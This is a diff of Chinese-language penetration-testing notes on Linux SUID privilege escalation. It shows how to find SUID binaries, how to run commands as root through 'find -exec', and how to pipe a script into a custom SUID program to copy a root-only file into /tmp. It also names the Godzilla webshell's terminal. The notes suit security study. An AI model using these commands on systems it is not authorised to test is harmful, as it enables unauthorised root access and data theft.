@@ -29,12 +29,27 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 这个命令会搜索整个文件系统，查找属于root用户且设置了SUID权限的文件。
 查找列出的命令，和实际存在SUID提权的命令比对，如有find，则find命令存在suid，可以使用find操作root权限，如执行whoami。
+**PS：有可能一些管理员自己写的程序也有suid，注意特殊路径下的文件名。**
 >find存在SUID是由于管理员经常查找文件，为了这个文件查找的结果更多，赋予了find查找程序suid的root权限
 而且find可以加-exec参数进行其他命令的组合，那么-exec后面的命令就是root权限执行。
 ```
 touch xiaodi
 find xiaodi -exec whoami \;
 即可返回root
+```
+
+^
+## **suid命令可能是交互式shell(一般不是，除非自定义的)**
+哥斯拉的超级终端是交互式shell。
+或者，传参执行。
+```
+已知/tmp/xxSuidElf是suid有root权限的执行命令，但是交互式命令
+
+echo "cat /root/哈哈.txt > /tmp/哈哈.txt " > tmp.sh
+chmod +x tmp.sh
+echo "tmp.sh"  |  /tmp/xxSuidElf
+
+此时查看/tmp/哈哈.txt
 ```
 
 
